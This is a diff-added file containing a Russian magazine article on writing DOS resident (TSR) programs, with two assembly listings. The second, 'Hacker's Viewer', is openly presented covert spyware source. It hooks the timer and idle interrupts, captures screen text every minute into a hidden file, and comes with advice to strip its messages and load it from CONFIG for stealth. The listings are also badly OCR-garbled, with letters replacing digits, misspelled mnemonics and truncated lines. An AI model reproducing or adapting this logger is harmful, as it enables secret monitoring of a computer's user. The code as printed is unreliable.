@@ -1,0 +1,585 @@
+А. Аброськин
+
+Снова о TSR, или как пользоваться функциями DOS и BIOS из Вашей
+резидентной программы
+
+Листинг 1
+
+;───────────────────────────────────────────────────────
+;  Может вызываться по прерыванию от таймера (1Ch)
+;───────────────────────────────────────────────────────
+DISP PROC FAR      ;  Фрагмент кода диспетчера
+                   ;  в ожидании DOS
+.........          ;
+call DOSstatus     ;  Получить состояние DOS
+call INTstatus     ;  Получить состояние BIOS
+xor  al,al         ;
+cmp  al,cs:FlagINT ;
+jne  exit          ;  Если не стабильно - возврат
+
+cmp  al,cs:FlagDOS ;  Если DOS нереентерабельна,
+jne  exit          ;  то выход из TSRprint,
+cmp  al,cs:FlagTSR ;  TSR активна ?
+jne exit           ;  Да - возврат
+call PopUp         ;  иначе активизируем PopUp
+exit:
+.........
+.........
+.........
+DISH ENDP
+
+;──────────────────────────────────────────────────────
+; Область данных резидентной части TSR программы
+;──────────────────────────────────────────────────────
+                   ;
+FlagINT db   0     ;  Флаг состояния BIOS
+FlagDOS db   0     ;  Флаг состояния DOS
+FlagTSR db   0     ;  Флаг активности PopUp
+                   ;
+DosMode dd   ?     ;  Адрес флага реентерабельности MS-DOS
+                   ;──────────────────────────────────────
+
+INTstatus proc near;  Возвращает флаг состояния
+                   ;  Установлен, если BIOS или
+                   ;  аппаратные средства нестастабильны
+     push ax       ;  Сохраняем регистр AX
+;─────────────────────────────────────────────────────────
+;       Проверяем состояние прерываний
+;   контроллера прерываний Intel 8259A
+;─────────────────────────────────────────────────────────
+   mov ax,0000101b ;  AH=0, AL=OCW для Intel 8259A
+   out 20h,al      ;  Запрашиваем "in-service"
+                   ;  регистр 8259A
+   jmp short chk   ;
+ chk: in al,20h    ;  Проверяем состояние прерываний
+                   ;  текущего состояния 8259A
+                   ;  (единичный бит, если "in-service")
+ cmp ah,al         ;
+ jc  exit_INT      ;  Возврат, если аппаратное прерывание
+
+;────────────────────────────────────────────────────────
+;       Проверяем состояние прерываний
+;                ROM-BIOS
+;────────────────────────────────────────────────────────
+                   ;
+  mov al,cs:FlagO5 ;  Проверяем флаг INTO5h:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov al,cs:Flag1B ;  Проверяем флаг INT1Bh:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov al,cs:Flag1O ;  Проверяем флаг INT1Oh:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov al,cs:Flag13 ;  Проверяем флаг INT13h:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov al,cs:Flag23 ;  Проверяем флаг INT23h:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov al,cs:Flag24 ;  Проверяем флаг INT24h:
+  cmp al,O         ;  если не сброшен,
+  jne exit_INT     ;  возврат
+  mov FlagINT,O    ;  Сбросить флаг состояния
+  jmp short exint  ;  и выйти из процедуры
+  exit_INT:
+  mov FlagINT,1    ;  Установить флаг состояния
+  jmp short exint  ;  и выйти из процедуры
+  exint:
+  pop ax           ;  Восстановить АХ
+  ret
+  INTstatus endp
+
+  DOSstatus prok near; Возвращает: флаг состояния
+                   ;   установлен, если MS-DOS
+                   ;   нереентерабельна
+ push ds           ;
+ push dx           ;   Сохраняем регистры
+ push ax           ;
+
+ ;────────────────────────────────────────────────────────
+ ;       Проверяем реентерабельность MS-DOS
+ ;────────────────────────────────────────────────────────
+ Ids bx,cs: DosMode;   Загружаем в AL
+ mov al, [bx]      ;   флаг активности DOS
+ xor bl, bl        ;
+ cmp bl, al        ;   Возврат из процедуры, если
+ jne exit_DOS      ;   система нестабильна,
+ mov FlagDOS,O     ;   иначе устанавливаем флаг
+ jmp short exdos   ;   реентерабельности DOS
+ exit_DOS:
+ mov FlagDOS,1     ;   Устанавливаем флаг
+ jmp short exdos   ;   нереентерабельности DOS
+ exdos:
+ pop ax            ;
+ pop dx            ;   Восстанавливаем регистры
+ pop ds            ;
+ ret
+ DOSstatus endp
+
+Листинг 2
+
+;
+;TASM HACKVIEW.ASM
+;TLIWK /T/X HACKVIEW.OBJ
+;
+;P.S. Для более незаметного подключения программы рекомендую
+;в Вашей (!) версии убрать все сообщения и загружать
+;программу из COWFIG командой install= ... \ hv.bin
+;
+;(hv.bin    copy/b hackvjew.hv.bin)
+;
+;────────────────────────────────────────────────────────────
+
+ INCLUDE MACRO.21
+ code segment
+      assume cs:code,ds:code
+      org 100h
+
+ start: jmp install       ; Инициализация
+                          ;
+ presenge   dv 06cEh      ; Ключевое слово присутстввия
+                          ; программы в памяти
+                          ;
+ pushf                    ;
+ cmp cs:mjnutes,1092      ;
+ jne exit                 ;
+ test cs:gate08,1         ; gate08 закрыты?
+ jnz exit08               ; Да, вызываем старый int 08h
+ popf                     ;
+ pushf                    ;
+call dvord ptr cs:[old08o]; Отрабатываем настоящий jnt 08h
+mov byte ptr cs:gate08,1  ; Закрываем ворота
+;─────────────────────────────────────────────────────────────
+call CopyBuffer           ; Пишем в буфер
+;─────────────────────────────────────────────────────────────
+mov byne ptr cs:gate08,0  ; Открываем ворота
+iret                      ; и выдаем IRET
+                          ;
+int08_entry  endp         ;
+
+exit  jnc  cs:minutes     ; Увеличиваем счетчик импульсов таймера
+                          ; на единицу
+exit08                    ;
+    popf                  ;
+    db OEAh               ; far jump на old int 08h
+old08o  dv  0             ; Старый адрес прерывания 08h - смещение
+old08s  dv  0             ; и сегмент
+                          ;
+;─────────────────────────────────────────────────────────────
+gate08  db  0             ; Открываем       0
+gate28  db  0             ; Открываем       0
+;─────────────────────────────────────────────────────────────
+
+CopyBuffer  proc  near    ; Копируем видеобуфер
+                          ;
+         push ax
+         push bx
+         push cx
+         push dx
+         push ds          ;
+         push es          ; Сохраняем регистры
+         push di          ;
+         push si
+ xor  ax,ax
+ mov  es,ax               ; По адресу 0:0449 считываем
+ mov  al,es:[0449h]       ; ключевой байт текущего видео-
+ cmp  al,7                ; режима (то же, что и IWT1Oh)
+ ja   short copyend       ; Если графический режим - выход
+ jl   short mode          ;
+ mov  ax, OBOOOh          ; Адрес b/v TextMode 80x25
+ jmp  short setup
+ mode:
+ cmp  al,3
+ ja   short copyend       ; Если графический режим - выход,
+ je   short text          ; если текстовый - новый адрес
+ cmp  al,2                ;
+ jne  short copyend       ; Текстовый режим 40x25
+ text:                    ;
+ mov  ax,OB80h            ; Стартовый адрес TextMode 80x25
+ setup
+ mov  ds,ax               ; Передаем видеосегмент в DS
+ xor  dx,dx
+ mov  al,160              ; Готовим необходимые регистры
+ mul  dl                  ; для корректной работы CoppyBuffer
+ mov  si,0
+ shl  si,1
+ add  si,ax
+ add  si,es:[044Eh]       ; Добавляем в SI смещение текущей
+ mov  ax,si               ; видеостраницы (слово адреса 0:044E)
+ push cs
+ pop  es
+ lea  di, byte ptr es:[Buffer]
+ mov  bx,25
+ mov  dx,80               ; В BX число строк, в DX - длина строки
+ cld                      ; Очищаем флаг направления
+ jmp  short live
+ memadd
+ add  ax,160              ; Добавляем смещение для следующей строки
+ mov  si,ax               ; и передвигаем указатель Buffer
+ jnc  di                  ; на 2 позиции вперед
+ inc  di                  ;
+ live:                    ;
+ mov  cx,dx               ;
+ again: movsb             ; Пересылаем символ
+ inc  si                  ; Пропускаем атрибут
+ loop again               ; Повторяем
+ push ax
+ push cx
+ push di
+ push si
+ push es                  ; Сохраняем регистры
+ push ds                  ; для возврата в цикл
+ push cs                  ; считывания строк
+ pop  ds
+ xor  ax,ax
+ mov  si,ax
+ lea  si,byta ptr ds:[EOL]
+ mov  cx,2
+ rep  movsb               ; Вставляем <EOL>
+ pop  ds                  ; Восстанавливаем
+ pop  es                  ; регистры и
+ pop  si
+ pop  di
+ pop  cx
+ pop  ax
+ dec  bx                  ; уменьшаем счетчик строк
+ jne  memadd
+ mov  cs:FlagBUF,1        ; Взводим флаг готовности
+ mov  cs:minutes,0        ; Обнуляем счетчик импульсов таймера
+ copyend:
+ pop  si
+ pop  di
+ pop  es
+ pop  ds
+ pop  dx                  ; Восстанавливаем
+ pop  cx                  ; регистры
+ pop  bx
+ pop  ax
+ ret
+ CopyBuffer   endp
+
+ CopyFile proc near
+
+   cli                    ;
+   in  al,21h             ; Для исполнения критического участка
+   or  al,00000001b       ; запрещаем прерывание от системного
+   out 21b,al             ; таймера ( бит 0 )
+   sti
+   mov ax,3300h           ; Получаем текущее состояние
+   int 21h                ; ситуации "hreak" и сохраняем
+   mov Break,dl           ; его для последующего восстановления
+   xor dl,dl              ; Запрещаем проверку ситуации "break"
+   mov ax,3301h           ; на время ввода-вывода с диска
+   int 21h                ;
+
+   push ds                ;
+   xor  bx,bx             ; Получаем расширенную информацию
+   mov  ab,59h            ; об ошибке и сохраняем ее для
+   int  21h               ; последующего восстановления
+
+   mov  cs:ErrorDS,ds     ;
+   pop  ds                ;
+   mov  cs:ErrorAX,ax     ;
+   mov  cs:ErrorBX,bx     ;
+   mov  cs:ErrorDX,dx     ;
+   mov  cs:ErrorSI,si     ;
+   mov  cs:ErrorDI,di     ;
+   mov  cs:ErrorES,es     ;
+                          ;
+   mov  ah,51h            ; Получаем адрес PSP
+                          ; текущего процесса
+   int  21h
+   mov  cs:PPSP,bx        ; BX=PSP текущего процесса
+   mov  bx,cs:TPSP        ; BX=резидентный PSP
+   mov  ah,50h            ; Устанавливаем адрес PSP
+   int  21h               ;
+                          ;
+   mov  ax,cs             ;
+   mov  ds,ax             ;
+   lea  dx,File           ;
+   mov  ah,30h            ; Открываем файл
+   mov  al,1              ; (единица) для записи
+   int  21h               ;
+
+   jc   open_error        ; Если не существует,
+                            попробуем его создать
+   open:
+                          ; Сохраняем "file handle"
+                          ; в BX
+  mov  bx,ax              ;
+  mov  ab,42h             ;
+  mov  al,2               ;
+  mov  cx,0               ;
+  mov  dx,0               ; Передвигаем указатель
+                          ; в конец файла (в AL - два)
+  int  21h
+
+  push  cs
+  pop  ds
+  lea  ds,Buffer
+  mov  cx,2050            ; В CX - число байтов для считывания
+  mov  ah,40h             ; Записываем Buffer в File
+  jnt  21h
+
+                          ;
+  close:                  ;
+  mov  ah,3Eh             ; Закрываем файл
+  jnt  21h
+  jmp  short exit 28H     ;
+                          ;
+  open_error              ;
+  mov  ax,cs
+  mov  ds,ax
+  lea  dx,File            ; Создаем "file handle"
+  mov  cx,02h             ; для File с атрибутом
+  mov  ah,3Ch             ; "hjdden" (CX=02h)
+  jnt  21h
+  jc   short exit 28H     ; Выходим по ошибке
+  jmp  short open         ; Переходим к работе с файлом
+                          ;
+                          ;
+  exit_28H                ;
+  mov  bx,PPSP            ; BX=предыдущий PSP
+  mov  ah,5Oh             ; Устанавливаем адрес PSP
+  jnt  21h
+                          ;
+  mov  dx,offset cs:ExError
+  mov  ax,5DOAh
+  jnt  21h
+
+                          ;
+  mov  dl,Break           ;
+  mov  ax,3301h           ;
+  jnt  21h
+  mov  cs:FlagBUF,0       ; Сбрасываем флажком буфера
+  exit_28H_end:
+  clj
+  jn  al,21h              ; Разрешаем замаскированное
+  and  al,11111110b       ; прерывание по таймеру
+  out  21h,al             ; (пишем ноль в бит 0)
+  stj
+  ret
+  CoppyFile endp
+ ;──────────────────────── DATA ───────────────────────
+ File    db"c:\himage.idx",0  ; Имя файла
+ Break   db  ?                ; Флаг проверки "break"
+ FlagBUF db  0                ; Флажок заполнения буфера
+ Buffer  db  2050 dup (020h0  ; Емкость для hacker's buffer
+ EOL     db  ODh,OAh          ; EOL для строк File
+ minutes dw  0                ; Число импульсов таймера
+                              ; ( 1 мин. = 1092 тика )
+ PPSP    dw  ?                ; Захваченный (не ваш) PSP
+ TPSP    dw  ?                ; Резидентный (наш) PSP
+                              ;
+
+ ExError  label byte          ; Захваченная расширенная
+                              ; информация об ошибке
+ ErrorAX  dw  ?
+ ErrorBX  dw  ?
+ ErrorCX  dw  ?
+ ErrorDX  dw  ?
+ ErrorSI  dw  ?
+ ErrorDI  dw  ?
+ ErrorDS  dw  ?
+ ErrorES  dw  ?
+          dw  3  dup (0)
+;─────────────────────────────────────────────────────────
+
+int28_entry   proc far        ; Обработчик прерывания 28Н
+                              ;
+pushf                         ;
+test cs:gate28,1              ; gate28 закрыты?
+jnz exit28                    ; Да, до свидания mr. FAR JUMP
+popf
+pushf                         ;
+call dword cs:[old28o]        ; Отрабатываем int 28h
+mov byte ptr cs:gate28,l      ; Закрываем ворота
+;─────────────────────────────────────────────────────────────────
+PushAll                       ; Save All Regisres
+cmp  cs:FlagBUF,l             ; buffer o'key?
+jne  short @@@                ; No
+call CopyFile                 ; Yes, пишем в файл
+@@@:                          ;
+PopAll                        ; Restore All Registers
+;───────────────────────────────────────────────────────────────────
+mov  byte ptr cs:gate28,0     ; Открываем ворота
+iret                          ;
+                              ;
+int28_entry    endp
+
+exit28:
+    popf
+    db  OEAh                  ; far jump на old 28h
+;────────────────────────────────────────────────────────────────────
+old28o  dw    0               ; Старый адрес прерывания 28H - смещение
+old28s  dw    0               ; и сегмент
+                              ;
+
+ ;──────────────────────────────────────────────────
+ ;             Инициализация
+ ;──────────────────────────────────────────────────
+install                       ;
+        mov ax,3508h          ; Получаем адрес
+        int 21h               ; прерывания 08h
+        mov ax,es:[bx-2]      ; Проверяем на присутствие
+        cmp ax,cs:presence    ; программы в памяти
+        jnz load              ; Нет - переход на load
+        jmp alreaby           ; Да - переход на already
+
+load:
+        push es
+        push ds
+        mov ah,51h
+        int 21h
+        mov cs:TPSP,bx        ; Запоминаем наш PSP;
+        mov ax,3508h          ; Получаем адрес
+        int 21h               ; прерывания 08h
+        mov word ptr old08s,es
+        mov word ptr old08o,bx
+                              ;
+                              ;
+        lea dx,int08_entry    ;
+        mov ax,2508h          ; Устанавливаем новый вектор
+        int 21h               ; прерывания 08h
+                              ;
+                              ;
+        mov ax,3528h          ; Получаем адрес
+        int 21h               ; прерывания 28h
+        mov word ptr old0
+        mov word ptr old08o,bx
+                              ;
+                              ;
+        lea dx,int28_entry    ;
+        mov ax,2528h          ; Устанавливаем новый вектор
+        int 21h               ; прерывания 28h
+
+        mov ax,cs             ;
+        mov ds,ax             ; Выводим сообщение
+        lea dx mes_load       ; об успешной загрузке
+        mov ax,0900h          ; программы
+        int 21h
+
+        pop ds                ; Восстанавливаем регистры
+        pop es                ;
+                              ;
+        mov dx,offset install ; Устанавливаем резидентную
+        int 27h               ; часть программы
+
+already:
+        mov al, ds:[082h]     ; Разбираем командную строку
+        cmp al,'/'            ; и проверяем на допустимые
+        je  key_l             ; ключи
+        jmp no_key
+key_l:
+        mov al, ds:[083h]
+        cmp al,'E'
+        je  key_2
+        cmp al,'e'
+        je  unload
+        jmp bad_key
+key_2
+        mov al,ds:[084h]
+        cmp al,'N'
+        je  key_3
+        cmp al,'n'
+        je  kej_3
+        jmp bad_key
+key_3
+        mov al,ds:[085h]
+        cmp al,'D'
+        je  unload
+        cmp al,'d'
+        je  unload
+        jmp bad_key
+
+
+unload:
+        mov ax,word ptr es:old08o ; Получаем адреса для
+        mov dx,word ptr es:old08s ; восстановления вектора INTO8H
+        mov cx,es                 ; Сохраняем резидентную
+                                  ; CS часть программы
+        cli
+        xor bx,bx                 ; Пересылаем ноль
+        mov es,bx                 ; в ES
+        mov bx,08h*4
+        mov es:[bx],ax            ; Восстанавливаем оригинальный
+        mov es:[bx+2],dx          ; вектор INTO8H
+
+        mov es,cx
+        mov ax,word ptr es:old28o ; Получаем адреса для
+        mov dx,word ptr es:old28s ; восстановления вектора INT28H
+        xor bx,bx
+        mov es,bx
+        mov bx,28h*4
+        mov es:[bx],ax            ; Восстанавливаем оригинальный
+        mov es:[bx+2],dx          ; вектор INT21H
+        sti
+
+        mov ah,49h
+        mov es,cx                 ; Восстанавливаем ES
+        int 21h                   ; и освобождаем память
+
+        mov ax, 0003h
+        int 10h
+        mov ax,cs
+        vov ds,ax
+        lea dx,unloaded           ;
+        mov ax,0900h              ; Выдаем сообщение об успешной
+        int 21h                   ; выгрузке программы
+        imp finish                ; из памяти
+
+no_key:
+        mov ax,cs                 ;
+        mov ds,ax                 ; Выдаем соответствующее
+        lea dx,loaded             ; сообщение о присутствии
+        mov ax, 0900h             ; программы в памяти
+        int 21h                   ;
+        jmp finish
+
+bad_key:
+         mov ax,cs                ;
+         mov ds,ax                ; Выдаем соответствующее
+         lea dx,error             ; сообщение о неверном
+         mov ax,0900h             ; ключе выгрузки
+         int 21h                  ;
+
+finish:
+         mov ax,4COOh             ; Завершаем программу
+         int 21h                  ;
+
+mes_load db  'O.key! Hacker s Viewer loaded. ' ,ODh,OAh,'$'
+  loaded db  'Hacker s Viewer already loaded!' ,ODh,OAh,'$'
+unloaded db  'Hacker s Viewer rewoved from MEMORY.',ODh,OAh,'$'
+  error  db  'For UNLOAD please begin to run with /END or/end.',ODh,OAh,'$'
+  code   ends
+         end  start
+;──────────────────────────────────────
+;         MAKRO. 21 for HACKVIEW.ASM
+;──────────────────────────────────────
+PushAll MACRO
+        pushf
+        push ax
+        push bx
+        push cx
+        push dx
+        push di
+        push si
+        push bp
+        push es
+        push ds
+        ENDM
+;──────────────────────────────────────
+PopAll  MACRO
+        pop  ds
+        pop  es
+        pop  bp
+        pop  si
+        pop  di
+        pop  dx
+        pop  cx
+        pop  bx
+        pop  ax
+        popf
+        ENDM
+
